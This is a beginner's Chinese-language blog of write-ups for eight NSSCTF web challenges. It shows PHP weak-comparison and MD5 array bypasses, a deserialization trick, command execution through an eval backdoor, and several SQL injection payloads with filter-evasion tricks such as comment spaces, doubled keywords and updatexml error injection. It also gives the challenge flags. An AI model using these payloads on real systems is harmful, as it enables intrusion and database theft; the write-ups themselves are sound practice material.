---
title: "nssctf学习中"
image: '/images/133301699_p0_master1200.jpg'
pinned: false
comment: true
published: 2025-11-11
description: "CTF 学习笔记与技术复盘"
category: 刷题
tags: [刷题]
---

这是一个基于nssctf做题的wp，本人纯新手。
做题没有顺序，基本是看我自己写哪一题，就写这题的wp，不分难度的。

# #1.[NSSCTF 2022 Spring Recruit]babyphp

题目内容:

```
\<?php
highlight_file(__FILE__);
include_once('flag.php');
if(isset($_POST['a'])&&!preg_match('/[0-9]/',$_POST['a'])&&intval($_POST['a'])){
    if(isset($_POST['b1'])&&$_POST['b2']){
        if($_POST['b1']!=$_POST['b2']&&md5($_POST['b1'])===md5($_POST['b2'])){
            if($_POST['c1']!=$_POST['c2']&&is_string($_POST['c1'])&&is_string($_POST['c2'])&&md5($_POST['c1'])==md5($_POST['c2'])){
                echo flag;
            }else{
                echo "yee";
            }
        }else{
            echo "nop";
        }
    }else{
        echo "go on";
    }
}else{
    echo "let's get some php";
}
?> let's get some php_
```



分析代码
首先，`isset(_POST['a']) && !preg_match('/[0-9]/', $_POST['a']) && intval(_POST['a'])`
存在a，a不含0-9的数字，intval(_POST['a']) 必须为真
查询代码，intval() 在转换时会尝试从字符串开头提取数字，直到遇到非数字字符。
preg_match 是 PHP 中用于执行正则表达式匹配的函数。
所有a可以用数组a[]=1
这样均满足 所有条件
第二，isset($_POST['b1']) && _POST['b2']
b1，b2有值且非空，然后比较md5
同样数组，MD5返回null
b1[]=2,b2[]=3
最后，`_POST['c1'] != $_POST['c2'] && is_string($_POST['c1']) && is_string($_POST['c2']) && md5($_POST['c1']) == md5(_POST['c2'])`
c1与c2均为字符串，且不同，又比较md5还是若比较，上网随便查一下，用科学计数法MD5，0e被当成0，随便找md5为0e开头的字符串。
所以 C:\Users\G1731>curl -X POST -d "a[]=1&b1[]=1&b2[]=2&c1=240610708&c2=QNKCDZO" http://node4.anna.nssctf.cn:28382/
用curl执行post，
得到flag，NSSCTF{2fd7b1ec-41c5-4895-a5d3-bc56cb172231}

---
# #2.[HUBUCTF 2022 新生赛]checkin

```
<?php
show_source(__FILE__);
username  = "this_is_secret"; 
$password  = "this_is_not_known_to_you"; 
include("flag.php");//here I changed those two 
$info = isset($_GET['info'])? $_GET['info']: "" ;
$data_unserialize = unserialize($info);
if ($data_unserialize['username']==$username&&$data_unserialize['password']==$password){
    echo flag;
}else{
    echo "username or password error!";

}

?>
```

get传参，分析一下代码
username = "this_is_secret";
password = "this_is_not_known_to_you";
定义账号，密码，然后又here I changed those two ，那直接就进入猜测阶段了，因为这用户名和密码要是有具体值，那不给其他提示就是猜了，又加上这是新生赛的题，初步猜测是空的吧。
data_unserialize = unserialize(_GET['info']);
反序列化，去查一下作用，unserialize() 函数会将用户通过 GET 参数 info 传入的字符串，还原为 PHP 中的变量。
if (data_unserialize['username']==$username&&$data_unserialize['password']==$password){
    echo flag;
}else{
    echo "username or password error!";
这一段要求弱比较我们传入的是否与服务器相等。
大抵思路就这样了，反序列化我不是很懂，所以问了一下ai

一、先明确序列化字符串的通用格式（数组类型）
PHP 中数组序列化后的格式是：a:数组长度:{键1的类型:键1长度:"键1值";值1的类型:值1长度:值1内容;键2的类型:键2长度:"键2值";值2的类型:值2长度:值2内容;}
a：表示变量类型是 array（数组）
i：表示变量类型是 integer（整数）
s：表示变量类型是 string（字符串）
冒号后的数字：表示 “长度”（数组长度 / 字符串长度，整数无长度属性）
仔细看看后，我们就能推出我们要传参的值了，info=a:2:{s:8:"username";i:0;s:8:"password";i:0;}
http: //node5.anna.nssctf.cn:26551/?info=a:2:{s:8:%22username%22;i:0;s:8:%22password%22;i:0;}
拿下flag
NSSCTF{ecd62ebd-98ea-4a71-aded-efab0995f71d}
也是运气好一点，弱比较成立了，不然又要卡一会了。

---
# #3.[羊城杯 2020]easycon

http: //node4.anna.nssctf.cn:28048/，给了个靶机点进去一看
![alt text](/images/QQ20251114-185817.png)
看到这个，我还以为我开错网站，看得跟什么软件的官方网站一样，确认几次后，才肯定这是我们题目的网站，嗯，没什么具体的思路，扫一扫

```
开始扫描......
http: //node4.anna.nssctf.cn:28048/index.php
http: //node4.anna.nssctf.cn:28048/.htaccess-local
http: //node4.anna.nssctf.cn:28048/.htaccess.txt
http: //node4.anna.nssctf.cn:28048/.htaccess/
http: //node4.anna.nssctf.cn:28048/.htaccess.BAK
```
没什么特别明显的东西，看一下robot
```
http: //node4.anna.nssctf.cn:28048/robots.txt
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at node4.anna.nssctf.cn Port 28048</address>
</body></html>
```
404都来了，看来目前是彻底没头绪了，看看能不能直接访问源码
C: \Users\G1731>curl http://node4.anna.nssctf.cn:28048/index.php

```html
<head>
     <style> div.main { margin-left:auto; margin-right:auto;  } body { background-color:        #FAEBA7; }</style>
     <title>
       welcome to YCBCTF
     </title>
</head>
<body>
<img src=gw2.jpg  width=49% height=60%>
    <img src=gw.jpg  width=49% height=60%>

    <br>
</div>
    </body>
</html>

<script>alert('eval post cmd')</script>
```
直接访问网站是加载不出来的，我用curl才有回应，这个代码告诉我们通过POST请求提交cmd，利用eval执行命令，那我们就试一试我的常用两件套，ls -la与cat
```bash -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "cmd=system('ls -la /');" http://node4.anna.nssctf.cn:28048/index.php

<html>
<head>
     <style> div.main { margin-left:auto; margin-right:auto;  } body { background-color:        #FAEBA7; }</style>
     <title>
       welcome to YCBCTF
     </title>
</head>
<body>
<img src=gw2.jpg  width=49% height=60%>
    <img src=gw.jpg  width=49% height=60%>

    <br>
</div>
    </body>
</html>

<script>alert('eval post cmd')</script>total 64
drwxr-xr-x    1 root root 4096 Nov 14 09:52 .
drwxr-xr-x    1 root root 4096 Nov 14 09:52 ..
-rwxr-xr-x    1 root root    0 Nov 14 09:52 .dockerenv
lrwxrwxrwx    1 root root    7 Oct  6  2021 bin -> usr/bin
drwxr-xr-x    2 root root 4096 Apr 15  2020 boot
drwxr-xr-x    5 root root  340 Nov 14 09:52 dev
drwxr-xr-x    1 root root 4096 Nov 14 09:52 etc
drwxr-xr-x    2 root root 4096 Apr 15  2020 home
lrwxrwxrwx    1 root root    7 Oct  6  2021 lib -> usr/lib
lrwxrwxrwx    1 root root    9 Oct  6  2021 lib32 -> usr/lib32
lrwxrwxrwx    1 root root    9 Oct  6  2021 lib64 -> usr/lib64
lrwxrwxrwx    1 root root   10 Oct  6  2021 libx32 -> usr/libx32
drwxr-xr-x    2 root root 4096 Oct  6  2021 media
drwxr-xr-x    2 root root 4096 Oct  6  2021 mnt
drwxr-xr-x    2 root root 4096 Oct  6  2021 opt
dr-xr-xr-x 1082 root root    0 Nov 14 09:52 proc
drwx------    2 root root 4096 Oct  6  2021 root
drwxr-xr-x    1 root root 4096 Jan 19  2022 run
lrwxrwxrwx    1 root root    8 Oct  6  2021 sbin -> usr/sbin
drwxr-xr-x    2 root root 4096 Oct  6  2021 srv
dr-xr-xr-x   13 root root    0 Nov 14 09:52 sys
drwxrwxrwt    1 root root 4096 Nov 14 09:52 tmp
drwxr-xr-x    1 root root 4096 Oct  6  2021 usr
drwxr-xr-x    1 root root 4096 Jan 19  2022 var
```
我靠，居然没看见flag相关的文件，那猫猫学长暂时不能出击了，再看看网站目录有没有
```fetch('http://node4.anna.nssctf.cn:28048/index.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'cmd=system("ls -l");'
})
.then(r => r.text())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));
Promise {<pending>}
VM21: 1 Fetch finished loading: POST "http://node4.anna.nssctf.cn:28048/index.php".
(anonymous) @ VM21:1
VM21: 7 
<html>
<head>
     <style> div.main { margin-left:auto; margin-right:auto;  } body { background-color: 	#FAEBA7; }</style>
     <title>
       welcome to YCBCTF
     </title>
</head>
<body>
<img src=gw2.jpg  width=49% height=60%>
    <img src=gw.jpg  width=49% height=60%>
    
    <br>
</div>
    </body>
</html>

<script>alert('eval post cmd')</script>total 220
-rwxrwxrwx 1 root root 129904 Aug 29  2020 bbbbbbbbb.txt
-rwxrwxrwx 1 root root  49898 Aug 29  2020 gw.jpg
-rwxrwxrwx 1 root root  22308 Aug 29  2020 gw2.jpg
-rwxrwxrwx 1 root root  10918 Jan 19  2022 index.html
-rwxrwxrwx 1 root root    394 Aug 29  2020 index.php
```
其实本来想用curl的，但是一直显示没连接上服务器，只能试一试JavaScript了，不过还好成功了，这里面返回了一个巨可疑的文件，bbbbbbbbb.txt，就是它，拿下
```fetch('http://node4.anna.nssctf.cn:28048/index.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'cmd=system("cat bbbbbbbbb.txt");'
})
.then(r => r.text())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));
```
执行该post后，我们得到了一串特别特别长的base64
```
</script>/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYJ..........................................
```
很长很长，我就不贴出来了，我放出来的不足千分之一，稍微研究了一下，发现这是图片base64解码的结果，我们扔给随波逐流，让它解码一下，最后得到这么一张图片
![alt text](/images/image_1.jpg)
这图片上是什么人我不知道，但flag来了
**GWHT{do_u_kn0w_c@idao}**
**改成nssctf形式，NSSCTF{do_u_kn0w_c@idao}**

---

# #4.[GDOUCTF 2023]受不了一点

给了一个靶机，点开看一下

```php
error_reporting(0);
header("Content-type:text/html;charset=utf-8");
if(isset(_POST['gdou'])&&isset($_POST['ctf'])){
    $b=$_POST['ctf'];
    $a=$_POST['gdou'];
    if($_POST['gdou']!=$_POST['ctf'] && md5($a)===md5($b)){
        if(isset($_COOKIE['cookie'])){
           if ($_COOKIE['cookie']=='j0k3r'){
               if(isset($_GET['aaa']) && isset($_GET['bbb'])){
                  $aaa=$_GET['aaa'];
                  $bbb=$_GET['bbb'];
                 if($aaa==114514 && $bbb==114514 && $aaa!=$bbb){
                   $give = 'cancanwordflag';
                   $get ='hacker!';
                   if(isset($_GET['flag']) && isset($_POST['flag'])){
                         die($give);
                    }
                   if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){
                       die($get);
                    }
                    foreach ($_POST as $key => $value) {
                        $$key = $value;
                   }
                    foreach ($_GET as $key => $value) {
                         $$key = $$value;
                    }
                   echo flag;
            }else{
                  echo "洗洗睡吧";
                 }
    }else{
        echo "行不行啊细狗";
        }
  }
}
else {
  echo '菜菜';
}
}else{
  echo "就这?";
}
}else{
  echo "别来沾边";
}
?>
别来沾边
```
想要获得flag，要过5关。

1.```if(_POST['gdou']!=$_POST['ctf'] && md5($a)===md5(b)){```

md5碰撞，弱比较，利用数组md5返回为null，构造两个数组。

2.```if(isset(_COOKIE['cookie'])){
if (_COOKIE['cookie']=='j0k3r'){```

强制cookie，Cookie: cookie=j0k3r。

3.```if(aaa==114514 && $bbb==114514 && $aaa!=bbb){```

依旧弱比较，aaa不等于bbb，根据字符串在弱比较时会转化成数字，直接搞定。

4.```if(isset(_GET['flag']) && isset($_POST['flag'])){
    die($give);  
}
if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){
    die(get);
}```
如果post或者get出现flag，直接die掉。

5.```foreach (_POST as $key => $value) {
    $$key = $value;
}
foreach ($_GET as $key => $value) {
    $$key = $$value;
}
echo $flag;```

想要获得flag，就不能覆盖flag的变量名，即在整个post和get的历遍过程中完全不触flag。

**所以我们最后的指令就完成了。**

**curl -X POST "http://node4.anna.nssctf.cn:28925/?aaa=114514&bbb=114514a"  -H "Cookie: cookie=j0k3r" -d "gdou[]=1&ctf[]=2"**

拿到flag，**NSSCTF{2de514f9-94c3-4f50-b0fe-168893466643}**
这题其实最后一步有点搞的，我一开始都没看懂是啥，要怎么不影响flag，也是大道至简的拿到flag了。


---

# #5.[SWPUCTF 2022 新生赛]ez_sql

![/alt text](/images/image-20260107213020508.png)

行吧，没办法了，nssctf就是这样的，做完，就不能在做了。

这是一题POST类的sql，要求传nss为参数。

经过测试发现，正好当nss=1‘时，满足闭合条件。

测试列数：

`nss=1' ORDER BY ? --+`

发现空格不被识别，导致错误，直接用/**/代替。

`nss=1'/**/ORDER/**/BY/**/?/**/#`

但是即便这样，页面显示语句出现der，而没有or，说明or吃过滤了。

`nss=1'/**/OORRDER/**/BY/**/?/**/#`

这样后就成功过去，发现列数为3.

直接尝试：

`id=-1'/**/UNION/**/SELECT/**/1,database(),3#`

找不到问题点。

尝试报错注入：

发现and没出现，尝试绕过。

`nss=-1'/**/AANDND/**/updatexml(1,concat(0x7e,database(),0x7e),1)#`

得到回显：

`NSS_tb`

进行爆表：

`nss=-1'/**/AANDND/**/updatexml(1,concat(0x7e,(sElEcT/**/table_name/**/fRoM/**/infoORrmation_schema.tables/**/wHeRe/**/table_schema='NSS_db'/**/limit/**/0,1),0x7e),1)#`

得到：

`NSS_tb users`

注入：

`nss=-1'/**/AANDND/**/updatexml(1,concat(0x7e,(sElEcT/**/Secr3t/**/fRoM/**/NSS_tb/**/limit/**/0,1),0x7e),1)#`

得到：flll444g Secr3t 还有一个啥，我忘了,也打不开网页了。

最后flag由于报错注入的限制，需要两段注入：

`nss=-1'/**/AANDND/**/updatexml(1,concat(0x7e,(sElEcT/**/mid(Secr3t,61,30)/**/fRoM/**/NSS_tb/**/limit/**/0,1),0x7e),1)#`

组合后得到flag：

**NSSCTF{cda53f56-6210-48d9-9dde-cd2d2b0d77dc}**



---



# #6.[suctf 2019]EasySQL

![image-20260108182717340](/images/image-20260108182717340.png)

经过简单的测试发现：

```
空格，union，updatexml，extractvalue，and，or，“,&，for，from，like
```

这些全部被过滤，尝试^异或，正好成功了。

探测出当前数据库名字为3个字符，但是观察黑名单，字符注入和报错注入的关键函数都吃过滤，要么就绕过，要么就换种方法。

所以，直接试一下堆叠注入，发现：

`1;show databases#`

正好可以,那就：

`1;show/**/tables;`

得到： `Array ( [0] => 1 ) Array ( [0] => Flag )`

读取过程中发现，Flag也吃过滤。

尝试绕过：

`fLaG，flag，flaG，FLAG` 均不行，疑似所有变体都吃拦截。 * 没有吃过滤，尝试 * 匹配。

但均失败。

多次进行读取测试，发现均失败，似乎后端代码不是正常我认识的sql语句。

看了一下wp。

？？？？？

```
select $_POST[‘query’] || flag from Flag
```

这啥，已经包含一个逻辑与了，那直接 `*,1` 就直接出来了。

![image-20260108184314625](/images/image-20260108184314625.png)

**NSSCTF{52f80380-dc4c-494d-9b01-5ddfe49a61d8}**



---



# #7.[SWPUCTF 2021 新生赛]sql

![image-20260108194438025](/images/image-20260108194438025.png)

观察html，发现get 参数为wllm。

测试了一下。

字符型，过滤了空格和--+,#。

`wllm='/**/order/**/by/**/3%23`

确定列数3.

`wllm='/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()%23`

找到目标，LTLT_flag。

`id=-1 UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name = '表名' **(读表)**`

由于我自己笔记里的记录为引号包裹的表名，题目里面引号又die了。

所以换成16进制数据。

`wllm=-1'/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/0x4c544c545f666c6167%23`

发现目标列，flag。

```
wllm=-1'/**/union/**/select/**/1,group_concat(concat(id,0x7e,flag)),3/**/from/**/LTLT_flag%23

wllm=-1'/**/union/**/select/**/1,group_concat(mid(flag,15,30)),3/**/from/**/LTLT_flag%23

wllm=-1'/**/union/**/select/**/1,mid(flag,40),3/**/from/**/LTLT_flag%23

wllm=-1'/**/union/**/select/**/1,mid(flag,20),3/**/from/**/LTLT_flag/**/where/**/id=1%23

wllm=-1'/**/union/**/select/**/1,flag,3/**/from/**/LTLT_flag/**/where/**/id=2%23
```

由于读取数据的限制，我试了好几次才拿到完整的flag。

![image-20260108194103653](/images/image-20260108194103653.png)

**NSSCTF{1de65552-bb8d-4af6-a726-3213451005a7}**



---



# #8.[GXYCTF 2019]BabySqli

一个登入页面，多次测试后，发现只有当用户名为admin时，才会出现wrong pass。

抓包，发现参数为:

![image-20260108203649101](/images/image-20260108203649101.png)

name跟pw。而且html上还有一个base64加32的信息。

解密得到： `select * from user where username = '$name'`

注入点为name。

随便几次测试发现

 `admin' order by 3#` 正常 。 `admin' order by 4#` 报错。

说明三列。

本来进行正常攻击，但之后就是绕过去也是wrong pass。

也是没招了，看了一下wp。

不是，传个数组，然后发现是md5加密？？？？

后端具体逻辑，就是第二列为用户名，第三列为md5解密的密码，要跟我们输入的密码进行比较。

```
name=admi' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'#&pw=1
```

不是，这个真的不算是爆破吗，正常谁传参数组？？？？

好阴啊。

![image-20260108203222688](/images/image-20260108203222688.png)

**NSSCTF{8c9f1139-03bf-4421-af17-c2b48003c861}**

---

---

---

---

---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
